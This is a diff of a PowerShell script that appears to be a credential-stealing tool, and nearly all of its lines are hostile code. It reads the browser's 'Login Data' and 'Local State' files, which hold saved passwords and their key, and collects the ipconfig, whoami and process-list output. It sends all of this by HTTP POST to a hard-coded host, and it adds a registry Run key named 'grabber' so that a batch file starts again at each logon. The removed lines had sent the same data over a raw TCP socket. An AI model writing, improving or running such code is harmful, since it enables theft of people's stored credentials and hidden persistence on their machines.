@@ -1,18 +1,27 @@
+$var += cat "Local State"
+
 cd Default
 
-$var = cat "Login Data"
+$var += cat "Login Data"
 
-cd Network
+$var += ipconfig 
 
-Write-Output $var | Out-File -FilePath ./Process.txt
+$var += whoami 
 
-Start-Sleep -Seconds 3
-
-$test=[io.file]::ReadAllBytes("Process.txt");
-$socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
-$stream = $socket.GetStream();
-$stream.write($test,0,$test.Length);
-$stream.close();
-$writer.flush();
+$var += ps 
 
 Start-Sleep -Seconds 3
+
+#start http post 
+
+#httpsend
+
+    $Response = Invoke-WebRequest -Method Post -URI http://192.168.0.107:80 -body $var -UseBasicParsing
+#set regedit
+
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "grabber" `
+    -Value "Desktop\#simple download.bat" 
+
+Start-Sleep -Seconds 1.5
+exit
